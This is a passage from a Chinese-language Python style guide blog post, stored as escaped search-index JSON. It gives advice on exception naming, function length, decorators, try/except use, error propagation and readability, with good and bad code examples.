<p>\u4f7f\u7528\u7f29\u5199\u7684\u65b9\u5f0f\uff0c\u53ef\u80fd\u4f1a\u4f7f\u4ee3\u7801\u66f4\u52a0\u7b80\u6d01\uff0c\u4f46\u662f\u4e5f\u4f1a\u4f7f\u4ee3\u7801\u66f4\u52a0\u96be\u4ee5\u7406\u89e3\uff0c\u5c24\u5176\u662f\u4ee5\u4e0a\u8fd9\u79cd\u53ea\u6709\u5728\u4e13\u4e1a\u9886\u57df\u624d\u4f1a\u7528\u5230\u7684\u7f29\u5199\u3002</p> </li> <li> <p>\u6df7\u6dc6\u4f7f\u7528\u81ea\u5b9a\u4e49\u5f02\u5e38\u7684\u540e\u7f00</p> <p>Example</p> <pre><code>class PotentialHiddenError(RuntimeError):\n    ...\n\nclass PotentialHiddenException(RuntimeError):\n    ...\n</code></pre> <p>\u5047\u8bbe\u4e00\u4e2a\u6708\u524d\u4f60\u5728 <code>exceptions.py</code> \u91cc\u5b9a\u4e49\u4e86\u8fd9\u4e24\u4e2a\u5f02\u5e38\uff0c\u4e00\u4e2a\u6708\u4e4b\u540e\u4f60\u9879\u76ee\u7684\u5176\u4ed6\u8d21\u732e\u8005\u5199\u4ee3\u7801\u7684\u65f6\u5019\u9700\u8981\u629b\u51fa\u4e00\u4e2a \u201c\u7528\u6237\u6f5c\u529b\u503c\u88ab\u9690\u85cf\u201d \u7684\u5f02\u5e38\uff0c\u8bf7\u95ee\u8be5\u629b\u51fa\u8c01\uff1f\u8fd9\u79cd\u8ff7\u60d1\uff08\u6df7\u6dc6\uff09\u60c5\u5f62\u548c\u5148\u524d\u63d0\u5230\u7684\u7b80\u76f4\u662f\u6b8a\u9014\u540c\u5f52\u3002</p> <p>\u6b64\u5916\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728 Python \u4e2d\uff0c\u66f4\u5e38\u7528\u7684\u5f02\u5e38\u7684\u540e\u7f00\u662f <code>Error</code>\uff0c\u800c\u4e0d\u662f <code>Exception</code>\u3002\uff08\u89c1\u5b98\u65b9\u6587\u6863\u4e2d\u7684 \u7528\u6237\u81ea\u5b9a\u4e49\u5f02\u5e38\uff09</p> </li> </ol> <p>\u547d\u540d\u7684\u5177\u4f53\u5199\u6cd5\u5e76\u4e0d\u662f\u8be5\u8282\u7684\u8ba8\u8bba\u91cd\u70b9\uff0c\u9a7c\u5cf0\u547d\u540d\u6cd5\u3001\u4e0b\u5212\u7ebf\u547d\u540d\u6cd5\u548c\u5308\u7259\u5229\u547d\u540d\u6cd5\u7684\u5177\u4f53\u5185\u5bb9\u4e5f\u5df2\u4eba\u5c3d\u7686\u77e5\uff0c\u8fd9\u91cc\u4fbf\u4e0d\u518d\u8d58\u8ff0\u3002</p> <p>\u5177\u4f53\u53ef\u4ee5\u53c2\u7167 Python \u4e4b\u7236 Guido \u63a8\u8350\u7684\u89c4\u8303\uff1a</p> Type Public Internal Modules <code>lower_with_under</code> <code>_lower_with_under</code> Packages <code>lower_with_under</code> Classes <code>CapWords</code> <code>_CapWords</code> Exceptions <code>CapWords</code> Functions <code>lower_with_under()</code> <code>_lower_with_under()</code> Global/Class Constants <code>CAPS_WITH_UNDER</code> <code>_CAPS_WITH_UNDER</code> Global/Class Variables <code>lower_with_under</code> <code>_lower_with_under</code> Instance Variables <code>lower_with_under</code> <code>_lower_with_under</code> (protected)  <code>__lower_with_under</code> (private) Method Names <code>lower_with_under()</code> <code>_lower_with_under()</code> (protected)  <code>__lower_with_under()</code> (private) Function/Method Parameters <code>lower_with_under</code> Local Variables <code>lower_with_under</code> <p>\u548c PEP-8 \u4e00\u6837\uff0c\u67d0\u4e9b IDE\uff08\u4f8b\u5982 PyCharm\uff09\u6216\u8005\u63d2\u4ef6\uff08\u4f8b\u5982 SonarLint\uff09\u4e5f\u53ef\u4ee5\u81ea\u52a8\u6807\u8bb0\u4f60\u4ee3\u7801\u4e2d\u4e0d\u9075\u5b88\u4e0a\u8ff0\u547d\u540d\u6cd5\u7684\u60c5\u51b5\u3002</p>","tags":["python"]},{"location":"blog/2022/220529-python-personal-styleguide/#42","title":"4.2 \u907f\u514d\u8fc7\u957f\u7684\u51fd\u6570","text":"<p>\u5982\u679c\u4f60\u53d1\u73b0\u4e00\u4e2a\u51fd\u6570\u7684\u957f\u5ea6\u8d85\u8fc7\u4e86 40 \u884c\uff0c\u90a3\u4e48\u5927\u6982\u7387\u8bf4\u660e\u8fd9\u4e2a\u51fd\u6570\u9700\u8981\u7cbe\u7b80\u3002</p> <p>\u4e0d\u5bf9\u51fd\u6570\u957f\u5ea6\u505a\u786c\u6027\u9650\u5236\uff0c\u4f46\u662f\u82e5\u4e00\u4e2a\u51fd\u6570\u8d85\u8fc7\u6765 40 \u884c\uff0c\u63a8\u8350\u8003\u8651\u4e00\u4e0b\u662f\u5426\u53ef\u4ee5\u5728\u4e0d\u635f\u5bb3\u7a0b\u5e8f\u7ed3\u6784\u7684\u60c5\u51b5\u4e0b\u5bf9\u5176\u8fdb\u884c\u5206\u89e3\u3002</p> <p>\u56e0\u4e3a\u5373\u4f7f\u73b0\u5728\u957f\u51fd\u6570\u8fd0\u884c\u826f\u597d\uff0c\u4f46\u51e0\u4e2a\u6708\u540e\u53ef\u80fd\u4f1a\u6709\u4eba\u4fee\u6539\u5b83\u5e76\u6dfb\u52a0\u4e00\u4e9b\u65b0\u7684\u884c\u4e3a\uff0c\u8fd9\u5bb9\u6613\u4ea7\u751f\u96be\u4ee5\u53d1\u73b0\u7684 bug\u3002\u4fdd\u6301\u51fd\u6570\u7684\u7b80\u7ec3\uff0c\u4f7f\u5176\u66f4\u52a0\u5bb9\u6613\u9605\u8bfb\u548c\u4fee\u6539\u3002</p> <p>\u5f53\u9047\u5230\u4e00\u4e9b\u5f88\u957f\u7684\u51fd\u6570\u65f6\uff0c\u82e5\u53d1\u73b0\u8c03\u8bd5\u6bd4\u8f83\u56f0\u96be\u6216\u662f\u60f3\u5728\u5176\u4ed6\u5730\u65b9\u4f7f\u7528\u51fd\u6570\u7684\u4e00\u90e8\u5206\u529f\u80fd\uff0c\u4e0d\u59a8\u8003\u8651\u5c06\u8fd9\u4e2a\u957f\u51fd\u6570\u8fdb\u884c\u62c6\u5206\u3002</p>","tags":["python"]},{"location":"blog/2022/220529-python-personal-styleguide/#43","title":"4.3 \u907f\u514d\u5728\u591a\u4e2a\u51fd\u6570\u91cc\u6784\u9020\u4e00\u6837\u7684\u4ee3\u7801","text":"<p>\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u6838\u5fc3\u5c31\u662f \u88c5\u9970\u5668\u3002</p> <p>\u4f8b\u5982\uff0c\u6211\u4eec\u9700\u8981\u5728\u6bcf\u4e2a\u51fd\u6570\u5185\u90fd\u8f93\u51fa\u65e5\u5fd7\uff1a</p> <pre><code>def buy(item: str, quantity: int):\n    print(f'Try to buy {quantity} {item}(s)')\n    try:\n        _inner_buy(item, quantity)\n    except Exception as e:\n        print(f'Action failed, reason: {e}')\n    finally:\n        print(time.asctime(time.localtime(time.time())))\n\ndef sell(item: str, quantity: int, operator: str):\n    print(f'Try to sell {quantity} {item}(s)')\n    try:\n        _inner_sell(item, quantity, operator)\n    except Exception as e:\n        print(f'Action failed, reason: {e}')\n    finally:\n        print(time.asctime(time.localtime(time.time())))\n</code></pre> <p>\u53ef\u89c1\uff0c\u6211\u4eec\u6bcf\u5199\u4e00\u4e2a\u51fd\u6570\uff0c\u90fd\u9700\u8981\u91cd\u590d\u5b9e\u73b0\u90a3\u51e0\u4e2a\u65e5\u5fd7\u8f93\u51fa\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5199\u4e00\u4e2a\u88c5\u9970\u5668\uff0c\u5c06\u91cd\u590d\u64cd\u4f5c\u63d0\u70bc\u51fa\u6765\uff1a</p> <pre><code>def logger(func):\n    action = func.__name__\n\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        item, quantity, *_ = args\n        print(f'Try to {action} {quantity} {item}(s)')\n        try:\n            return func(*args, **kwargs)\n        except Exception as e:\n            print(f'Action failed, reason: {e}')\n        finally:\n            print(time.asctime(time.localtime(time.time())))\n    return wrapper\n</code></pre> <p>\u8fd9\u6837\uff0c\u6211\u4eec\u7684 <code>buy</code> \u548c <code>sell</code> \u51fd\u6570\u4fbf\u53ef\u4ee5\u5199\u6210</p> <pre><code>@logger\ndef buy(item: str, quantity: int):\n    _inner_buy(item, quantity)\n\n@logger\ndef sell(item: str, quantity: int, operator: str):\n    _inner_sell(item, quantity, operator)\n</code></pre>","tags":["python"]},{"location":"blog/2022/220529-python-personal-styleguide/#44-try-except","title":"4.4 \u907f\u514d\u6ee5\u7528 <code>try except</code> \u8bed\u53e5","text":"<p>\u4e0d\u8981\u61d2\u60f0\u5230\u8ba9 <code>try except</code> \u8bed\u53e5\u6765\u5e2e\u4f60\u627e\u5230\u9519\u8bef\uff01</p> <p><code>try except</code> \u8bed\u53e5\u901a\u5e38\u662f\u7528\u4e8e\u5904\u7406\u9519\u8bef\u548c\u5f02\u5e38\u7684\uff0c\u4f46\u8fd9\u4e0d\u610f\u5473\u7740\u6240\u6709\u7684\u9519\u8bef\u548c\u5f02\u5e38\u90fd\u5fc5\u987b\u7ecf\u8fc7\u5b83\u7684\u624b\u5904\u7406\u3002\u5982\u679c\u662f\u4e00\u4e9b\u663e\u800c\u6613\u89c1\u7684\u9519\u8bef\uff0c\u5219\u5e94\u5f53\u907f\u514d\u4f7f\u7528 <code>try except</code> \u8bed\u53e5\uff0c\u800c\u662f\u76f4\u63a5\u6d88\u5316\u8fd9\u4e2a\u53ef\u80fd\u629b\u51fa\u7684\u5f02\u5e38\u3002</p> <p>Example</p> <p>Good:</p> <pre><code>def get_player_name(play_record: dict[str, Any]) -&gt; str:\n    if play_record and 'name' in play_record[0]:\n        return play_record[0]['name']\n    else:\n        return 'Unknown'\n</code></pre> <p>Bad:</p> <pre><code>def get_player_name(play_record: dict[str, Any]) -&gt; str:\n    try:\n        return play_record[0]['name']\n    except (KeyError, IndexError):\n        return 'Unknown'\n</code></pre> <p>\u6b64\u4e3e\u662f\u4e3a\u4e86\u660e\u786e\u9519\u8bef\u7684\u539f\u56e0\u3002\u4ee5\u4e0a\u9762\u4e3a\u4f8b\uff0c\u5728\u5bf9\u4e00\u4e2a <code>list</code> \u6216 <code>dict</code> \u53cd\u590d\u4f7f\u7528 <code>__getitem__</code> \u65f6\uff08\u4f8b\u5982\u6709\u4e9b\u6784\u9020\u590d\u6742\u7684 json \u53ef\u80fd\u4f1a\u5d4c\u5957\u597d\u51e0\u5c42\uff09\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4 <code>KeyError</code> \u548c <code>IndexError</code> \u7684\u9519\u8bef\u3002\u4f46\u662f\u7b80\u5355\u5730\u63a5\u4f4f\u9519\u8bef\u5e76\u4e0d\u80fd\u77e5\u9053\u5177\u4f53\u662f\u54ea\u4e2a\u5730\u65b9\u8c03\u7528 <code>__getitem__</code> \u65b9\u6cd5\u65f6\u51fa\u9519\u4e86\uff0c\u662f\u4e00\u79cd\u6666\u6da9\u7684\u5904\u7406\u65b9\u6cd5\u3002</p>","tags":["python"]},{"location":"blog/2022/220529-python-personal-styleguide/#45","title":"4.5 \u4e0d\u8981\u6d88\u5316\u81ea\u5df1\u4e0d\u8be5\u5904\u7406\u7684\u9519\u8bef","text":"<p>\u4ec0\u4e48\u662f\u81ea\u5df1\u4e0d\u8be5\u5904\u7406\u7684\u9519\u8bef\uff1f</p> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u4f60\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u8bfb\u53d6\u4e00\u4e2a json \u6587\u4ef6\uff0c\u5e76\u5c06\u5176\u8f6c\u6362\u4e3a\u4e00\u4e2a <code>dict</code> \u5bf9\u8c61\u3002</p> <p>\u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff1a</p> <ul> <li>\u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u51fd\u6570\u600e\u4e48\u529e\uff1f</li> <li>\u5982\u679c\u6587\u4ef6\u5185\u5bb9\u4e0d\u662f\u4e00\u4e2a json \u5b57\u7b26\u4e32\uff0c\u51fd\u6570\u600e\u4e48\u529e\uff1f</li> </ul> <p>\u4e00\u4e9b\u5f00\u53d1\u8005\u53ef\u80fd\u4f1a\u8ba9\u8be5\u51fd\u6570\u9047\u5230\u9519\u8bef\u65f6\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5b57\u5178\uff0c\u6216\u8005\u8fd4\u56de <code>None</code> \u5bf9\u8c61\u3002\u6211\u4e2a\u4eba\u662f\u5f88\u4e0d\u8d5e\u540c\u8fd9\u4e2a\u505a\u6cd5\u7684\u3002</p> <p>\u7b2c\u4e00\u4e2a\u95ee\u9898\u663e\u7136\u4e0d\u662f\u5b83\u9700\u8981\u5173\u5fc3\u7684\u4e8b\u60c5\uff0c\u56e0\u6b64\u5982\u679c\u9047\u5230\u6587\u4ef6\u4e0d\u5b58\u5728\u7684\u60c5\u51b5\uff0c\u5b83\u539f\u5219\u4e0a\u5e94\u8be5\u7167\u5e38\u5411\u4e0a\u629b\u51fa <code>FileNotFoundError</code> \u5185\u7f6e\u5f02\u5e38\uff0c\u800c\u4e0d\u662f\u79c1\u81ea\u6d88\u5316\u6389\u8fd9\u4e2a\u5f02\u5e38\u3002</p> <p>\u7b2c\u4e8c\u4e2a\u95ee\u9898\u663e\u7136\u624d\u662f\u5b83\u9700\u8981\u5173\u5fc3\u7684\u4e8b\uff0c\u4f46\u5904\u7406\u65b9\u5f0f\u4e5f\u7edd\u4e0d\u662f\u5f53\u4f5c\u6ca1\u6709\u9519\u8bef\u53d1\u751f\u5e76\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5b57\u5178\u6216\u662f <code>None</code> \u5bf9\u8c61\u3002\u6b63\u786e\u7684\u5904\u7406\u65b9\u5f0f\u4f9d\u7136\u662f\u5411\u4e0a\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38\uff0c\u8fd9\u4e2a\u5f02\u5e38\u53ef\u4ee5\u662f <code>RuntimeError</code> \u6216\u662f\u7ee7\u627f\u81ea\u5b83\u7684\u81ea\u5b9a\u4e49\u5f02\u5e38\u3002</p> <p>\u4e8b\u5b9e\u4e0a\uff0cPython \u6807\u51c6\u5e93\u4e2d\u7684 json \u5e93\uff08<code>json.load()</code> \u51fd\u6570\uff09\u4fbf\u662f\u8fd9\u4e48\u505a\u7684\u3002</p> <ul> <li> <p><code>\u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u51fd\u6570\u600e\u4e48\u529e\uff1f</code></p> <p>\u4e0d\u53ef\u80fd\u5728 <code>json.load()</code> \u51fd\u6570\u4e2d\u89e6\u53d1\u8be5\u5f02\u5e38\uff0c\u56e0\u4e3a\u5b83\u5e76\u4e0d\u76f4\u63a5\u8bfb\u53d6\u6587\u4ef6\uff0c\u800c\u662f\u53ea\u4f7f\u7528\u4f20\u9012\u5230\u53c2\u6570\u7684\u6587\u4ef6\u6307\u9488\uff0c\u5373\u5b83\u7684\u7b2c\u4e00\u4e2a\u5f62\u53c2\uff1a<code>fp: SupportsRead[str | bytes]</code>\u3002</p> <p>\u800c\u629b\u51fa <code>FileNotFoundError</code> \u5f02\u5e38\u7684\u51fd\u6570\u901a\u5e38\u662f\u6784\u9020\u6587\u4ef6\u6307\u9488\u7684\u51fd\u6570\uff0c\u5373 <code>open()</code> \u51fd\u6570\u3002</p> </li> <li> <p><code>\u5982\u679c\u6587\u4ef6\u5185\u5bb9\u4e0d\u662f\u4e00\u4e2a json \u5b57\u7b26\u4e32\uff0c\u51fd\u6570\u600e\u4e48\u529e\uff1f</code></p> <p><code>json.load()</code> \u4f1a\u5411\u4e0a\u629b\u51fa <code>json.decoder.JSONDecodeError</code> \u5f02\u5e38\uff0c\u800c\u7edd\u4e0d\u662f\u79c1\u81ea\u6d88\u5316\u5b83\u3002</p> </li> </ul> <p>\u4e00\u4e2a\u79c1\u81ea\u6d88\u5316\u4e0d\u8be5\u5904\u7406\u7684\u5f02\u5e38\u7684\u51fd\u6570\uff0c\u5c31\u50cf\u662f\u4e00\u4e2a\u552f\u552f\u8bfa\u8bfa\u7684\u5c0f\u7537\u5b69\uff0c\u5f53\u53d7\u5230\u4e86\u6b3a\u8d1f\u7684\u65f6\u5019\uff0c\u88ab\u5bb6\u957f\u95ee\u8d77\u6765\u4e5f\u53ea\u662f\u4e00\u95ee\u4e09\u4e0d\u77e5\uff0c\u4e1d\u6beb\u4e0d\u900f\u9732\u81ea\u5df1\u53d1\u751f\u4e86\u4ec0\u4e48\u4e8b\u60c5\u3002</p> <p>\u53ea\u6709\u5f53\u4f60\u5f88\u660e\u786e\u8fd9\u4e2a\u51fd\u6570\u8be5\u6d88\u5316\u8fd9\u4e2a\u5f02\u5e38\u7684\u65f6\u5019\uff0c\u624d\u53bb\u5904\u7406\u5b83\uff0c\u4e0d\u8be5\u6d88\u5316\u7684\u65f6\u5019\uff0c\u8bb0\u5f97\u76f4\u63a5\u5411\u4e0a\u629b\u51fa\uff01\u53ea\u6709\u8fd9\u6837\uff0cPython \u7684 traceback \u624d\u80fd\u66f4\u52a0\u6e05\u6670\u5730\u663e\u793a\u51fa\u9519\u7684\u539f\u56e0\u3002</p>","tags":["python"]},{"location":"blog/2022/220529-python-personal-styleguide/#46","title":"4.6 \u4e0d\u8981\u4e3a\u4e86\u70ab\u6280\u800c\u6545\u610f\u964d\u4f4e\u4ee3\u7801\u53ef\u8bfb\u6027","text":"<p>\u5f15\u7528</p> <p>\u4ee3\u7801\u7684\u9605\u8bfb\u9891\u7387\u8fdc\u9ad8\u4e8e\u7f16\u5199\u4ee3\u7801\u7684\u9891\u7387\u3002</p> <p>Code is read much more often than it is written.</p> <p>\u2014\u2014 Python \u521b\u59cb\u4eba Guido van Rossum\uff08\u539f\u6587\u89c1 PEP-8\uff09</p> <p>\u5199\u51fa\u5f88\u9177\u7684\u4ee3\u7801\u7684\u786e\u662f\u4e00\u4ef6\u632f\u594b\u4eba\u5fc3\u7684\u4e8b\u60c5\uff0c\u4f46\u8fd9\u4e0d\u610f\u5473\u7740\u4f60\u9700\u8981\u5c06\u5176\u5199\u6210\u53ea\u6709\u4f60\u81ea\u5df1\u624d\u80fd\u770b\u61c2\u7684\u6837\u5b50\u3002\u4e00\u4efd\u597d\u7684\u4ee3\u7801\uff0c\u4e0d\u4ec5\u9700\u8981\u9610\u8ff0\u6e05\u6670\u3001\u6ca1\u6709\u6b67\u4e49\u3001\u4fbf\u4e8e\u7406\u89e3\u3001\u903b\u8f91\u6b63\u786e\uff0c\u8fd8\u9700\u8981\u6709\u5f88\u597d\u7684\u53ef\u8bfb\u6027\u548c\u53ef\u7ef4\u62a4\u6027\u3002</p> <ul> <li>\u53ef\u8bfb\u6027\uff1a\u63a5\u8fd1\u81ea\u7136\u8bed\u8a00\u6216\u8005\u4e60\u8bed\uff0c\u4e0d\u9700\u8981\u8fc7\u591a\u601d\u7ef4\u8f6c\u6362\u548c\u8111\u8865\u4fbf\u80fd\u770b\u61c2\u4ee3\u7801\u903b\u8f91\uff0c\u800c\u975e\u4e0d\u660e\u89c9\u5389\u3002</li> <li>\u53ef\u7ef4\u62a4\u6027\uff1a\u4ee3\u7801\u903b\u8f91\u7531\u591a\u4e2a\u72ec\u7acb\u7ec4\u4ef6\u6784\u6210\uff0c\u8026\u5408\u5ea6\u4f4e\uff0c\u4fbf\u4e8e\u7ef4\u62a4\u548c\u4fee\u6539\uff0c\u4e00\u4e2a\u7ec4\u4ef6\u7684\u4fee\u6539\u4e0d\u4f1a\u5bf9\u5176\u4ed6\u7ec4\u4ef6\u9020\u6210\u592a\u5927\u5f71\u54cd\u3002</li> </ul> <p>\u5f53\u4ed6\u4eba\u9605\u8bfb\u4f60\u5199\u7684\u4ee3\u7801\u65f6\uff0c\u4f60\u5e94\u5f53\u8bbe\u6cd5\u8ba9\u4eba\u5bb6\u56e0\u4e3a\u4ee3\u7801\u7684\u8bed\u53e5\u4f18\u7f8e\u3001\u6784\u601d\u7cbe\u5999\u3001\u601d\u8651\u7f1c\u5bc6\u800c\u5927\u547c \u201c\u5367\u69fd\u201d\uff0c\u800c\u4e0d\u662f\u8ba9\u4eba\u5bb6\u56e0\u4e3a\u4ee3\u7801\u7684\u6666\u6da9\u96be\u61c2\u800c\u5927\u9a82 \u201c\u6211\u64cd\u201d\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u6545\u610f\u964d\u4f4e\u4ee3\u7801\u53ef\u8bfb\u6027\u7684\u793a\u4f8b\uff1a</p> <p>\u5178\u578b 1\uff1a\u6545\u610f\u8fdb\u884c\u4e0d\u5fc5\u8981\u7684\u4ee3\u7801\u538b\u7f29</p> <p>Example</p> <p>\u6ce8\u610f\uff1a\u4e0b\u65b9\u7684 <code>chain(*iterables)</code> \u51fd\u6570\u7684\u7528\u9014\u662f\u5c06\u591a\u4e2a\u53ef\u8fed\u4ee3\u5bf9\u8c61\u5408\u5e76\u6210\u4e00\u4e2a\u8fed\u4ee3\u5668\u3002</p> <p>Good:</p> <pre><code>def get_command_list_for_type(\n        self,\n        type_: Type[_T],\n        search_in_timing_group: bool = False,\n        exclude_noinput: bool = False,\n) -&gt; Iterator[_T]:\n\"\"\"Return an iterator of commands of the given type.\"\"\"\n    if type_ == ArcTap:\n        list_of_arctap_list = (arc.arctap_list for arc in self.command_list if isinstance(arc, Arc))\n        list_in_chart = chain(*list_of_arctap_list)\n    else:\n        list_in_chart = (command for command in self.command_list if isinstance(command, type_))\n\n    if search_in_timing_group:\n        list_of_cmd_list_from_timing_group = (\n            timing_group.get_command_list_for_type(\n                type_,\n                search_in_timing_group,\n                exclude_noinput,\n                self.end_time\n            )\n            for timing_group in self.get_command_list_for_type(TimingGroup)\n        )\n        list_in_timing_group = chain(*list_of_cmd_list_from_timing_group)\n\n        return chain(list_in_chart, list_in_timing_group)\n\n    return list_in_chart\n</code></pre> <p>Bad:</p> <pre><code>def get_command_list_for_type(self, type_: Type[_T], search_in_timing_group: bool = False, exclude_noinput: bool = False) -&gt; Iterator[_T]:\n\"\"\"Return an iterator of commands of the given type.\"\"\"\n    list_in_chart = chain(*(arc.arctap_list for arc in self.command_list if isinstance(arc, Arc))) if type_ == ArcTap else (command for command in self.command_list if isinstance(command, type_))\n    return list_in_chart if search_in_timing_group else chain(list_in_chart, chain(*(timing_group.get_command_list_for_type(type_, search_in_timing_group, exclude_noinput, self.end_time) for timing_group in self.get_command_list_for_type(TimingGroup))))\n</code></pre> <p>\u53ef\u8bfb\u6027\u51e0\u4e4e\u4e3a 0\uff0c\u6211\u77e5\u9053\u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u4e09\u884c\u5199\u5b8c\uff0c\u4f46\u662f\u4f55\u5fc5\u5462\uff1f\u8003\u7814\u82f1\u8bed\u957f\u96be\u53e5\u6211\u5df2\u7ecf\u770b\u5f97\u591f\u591a\u4e86\uff0c\u5230\u4e86 Python \u8fd9\u91cc\u8fd8\u9700\u8981\u6211\u518d\u6765\u5e2e\u4f60\u5212\u4e00\u4e0b\u53e5\u5b50\u6210\u5206\u548c\u4ece\u53e5\u5417\uff1f</p> <p>\u5178\u578b 2\uff1a\u6ee5\u7528\u8bed\u6cd5\u7cd6</p> <p>Example</p> <p>Good:</p> <pre><code>msg = 'the fox jumped over the lazy dog'\nnew_msg_list = []\n\nfor char in msg:\n    if char == ' ':\n        new_msg_list.append(' ')\n    else:\n        new_msg_list.append(chr((ord(char) - ord('a') + 1) % 26 + ord('a')))\n\nnew_msg = ''.join(new_msg_list)\n</code></pre> <p>Bad:</p> <pre><code>msg = 'the quick brown fox jumps over the lazy dog'\nnew_msg = ''.join(' ' if char == ' ' else chr((ord(char) - ord('a') + 1) % 26 + ord('a')) for char in msg)\n</code></pre> <p>\u6ee5\u7528\u8bed\u6cd5\u7cd6\u7684\u6700\u5927\u95ee\u9898\u662f\uff0c\u5bf9\u975e Python \u4f7f\u7528\u8005\u975e\u5e38\u4e0d\u53cb\u597d\u3002\u8bf7\u6ce8\u610f\uff0c\u4f60\u6240\u5199\u7684\u4ee3\u7801\u4e0d\u4ec5\u4ec5\u662f\u7ed9 Python \u4f7f\u7528\u8005\u770b\u7684\uff0c\u540c\u65f6\u4e5f\u662f\u7ed9\u6240\u6709\u4eba\u770b\u7684\u3002</p> <p>\u8fd9\u5c31\u50cf\u4f60\u7528\u6587\u8a00\u6587\u5199\u51fa\u4e00\u6bb5\u975e\u5e38\u4f18\u96c5\uff08\uff1f\uff09\u7684\u5c0f\u4f5c\u6587\uff0c\u7136\u540e\u62ff\u7ed9\u4e2d\u6587\u4e0d\u719f\u7ec3\u7684\u56fd\u9645\u53cb\u4eba\u770b\uff0c\u5e76\u95ee\u4ed6 \u201c\u563f\u8001\u5916\uff0c\u770b\u770b\u6211\u5199\u7684\u6587\u7ae0\uff0c\u591a\u4e48\u4f18\u96c5\uff01\u201d\uff0c\u4eba\u5bb6\u53ef\u80fd\u5e76\u4e0d\u4f1a\u89c9\u5f97\u4f60\u4f18\u96c5\uff0c\u751a\u81f3\u4f1a\u89c9\u5f97\u4f60\u6709\u4ec0\u4e48\u5927\u75c5\u3002</p> <p>\u4e3a\u4e86\u8ba9\u6240\u6709\u4eba\u90fd\u80fd\u770b\u61c2\uff0c\u6709\u4e2a\u65f6\u5019\u4e0d\u5f97\u4e0d\u653e\u5f03\u4e00\u4e9b\u8f83\u4e3a Pythonic \u7684\u5199\u6cd5\u3002</p> <p>\u4f8b\u5982\u8fd9\u91cc\u7684</p> <pre><code>A if condition else f(B) for B in list_of_B\n</code></pre> <p>\u662f\u4e00\u4e2a\u975e\u5e38 Pythonic \u7684\u8bed\u6cd5\u7cd6\uff0c\u5bf9\u4e8e Python \u4f7f\u7528\u8005\u6765\u8bf4\u8fd9\u51e0\u4e4e\u6ca1\u4ec0\u4e48\uff0c\u751a\u81f3\u975e\u5e38\u68d2\uff0c\u4f46\u662f\u5bf9\u975e Python \u4f7f\u7528\u8005\u6765\u8bf4\uff0c\u9605\u8bfb\u8be5\u6bb5\u4ee3\u7801\u7b80\u76f4\u548c\u5750\u7262\u4e00\u6837\u3002</p> <p>\u63d0\u793a</p> <p>\u8fd9\u91cc\u7528\u5230\u4e86\u4e24\u4e2a\u8bed\u6cd5\u7cd6\uff1a</p> <ul> <li>Python \u4e09\u5143\u8fd0\u7b97\u7b26\uff08\u53c2\u89c1 \u6761\u4ef6\u8868\u8fbe\u5f0f\u3001PEP-308\uff09</li> <li>Python \u751f\u6210\u5668\u8868\u8fbe\u5f0f\uff08\u53c2\u89c1 \u751f\u6210\u5668\u8868\u8fbe\u5f0f\u3001\u5217\u8868\u63a8\u5bfc\u5f0f\uff09</li> </ul> <p>\u7ea0\u7ed3\u7684\u95ee\u9898\u5728\u4e8e\u5b83\u7684\u6267\u884c\u987a\u5e8f\u662f</p> <pre><code>(A if condition else f(B)) for B in list_of_B\n</code></pre> <p>\u8fd8\u662f</p> <pre><code>A if condition else (f(B) for B in list_of_B)\n</code></pre> <p>\uff08\u4e8b\u5b9e\u4e0a\u524d\u8005\u662f\u6b63\u786e\u7684\u6267\u884c\u987a\u5e8f\uff09</p> <p>\u56e0\u6b64\uff0c\u5728\u4f60\u8d39\u5c3d\u5fc3\u601d\u7528\u8bed\u6cd5\u7cd6\u5199\u51fa\u4e00\u4e9b\u8ba9\u4eba\u4e0d\u660e\u89c9\u5389\u4ee3\u7801\u7684\u540c\u65f6\uff0c\u4e5f\u8bf7\u5173\u7167\u4e00\u4e0b\u4e0d\u4f7f\u7528\u4f60\u8fd9\u79cd\u8bed\u8a00\u7684\u5f00\u53d1\u8005\u3002\u5f53\u7136\uff0c\u5982\u679c\u4f60\u5199\u7684\u65f6\u5019\u5c31\u6ca1\u60f3\u7740\u8ba9\u975e Python \u4f7f\u7528\u8005\u770b\u61c2\uff0c\u90a3\u4f60\u4e5f\u53ef\u4ee5\u5ffd\u7565\u8fd9\u4e00\u6761\u3002</p> <p>\u5178\u578b 3\uff1a\u6ee5\u7528\u9b54\u6cd5\u65b9\u6cd5</p> <p>Python \u7684\u5f3a\u5927\u4e4b\u5904\u5728\u4e8e\uff0c\u5b83\u5bf9 <code>\u5bf9\u8c61</code> \u63d0\u4f9b\u4e86\u5404\u79cd\u5404\u6837\u4e30\u5bcc\u7684 \u9b54\u6cd5\u65b9\u6cd5\u3002\u5bf9\u4e8e Python \u65b0\u624b\uff0c\u53ef\u4ee5\u5c06\u9b54\u6cd5\u65b9\u6cd5\u7406\u89e3\u4e3a Python \u5bf9 <code>\u5bf9\u8c61</code> \u7684\u8fd0\u7b97\u7b26\u91cd\u8f7d\u3002\u5f97\u76ca\u4e8e Python <code>\u4e00\u5207\u7686\u5bf9\u8c61</code> \u7684\u4e16\u754c\u89c2\uff0c\u4f60\u53ef\u4ee5\u501f\u52a9\u8fd9\u4e9b\u9b54\u6cd5\u5728\u6574\u4e2a Python \u4e16\u754c\u4e2d\u5b9e\u73b0\u5404\u79cd\u5404\u6837\u7684\u5947\u6280\u6deb\u5de7\u3002</p> <p>\u548c\u5176\u4ed6\u6240\u6709\u652f\u6301\u8fd0\u7b97\u7b26\u91cd\u8f7d\u7684\u8bed\u8a00\u4e0d\u540c\uff0c\u4f60\u5728 Python 